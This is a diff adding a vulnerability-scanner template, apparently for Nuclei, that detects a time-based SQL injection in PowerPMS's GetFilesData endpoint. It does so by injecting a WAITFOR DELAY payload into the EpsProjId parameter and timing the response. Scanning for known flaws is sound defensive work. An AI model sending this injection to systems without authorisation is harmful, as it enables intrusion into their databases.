@@ -1,0 +1,36 @@
+id: poc-yaml-powerpms-getfilesdata-sqli
+info:
+  name: PowerPMS GetFilesData SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(4,9)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        POST /UploadFle/GetFilesData?EpsProjId=1';WAITFOR+DELAY+'0:0:{{t1}}'--&StartDate=2&EndDate=2 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"success\":true"
+          - "\"message\":\"\""
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "<"
+      - type: dsl
+        dsl:
+          - "duration > t1 && duration < t2"
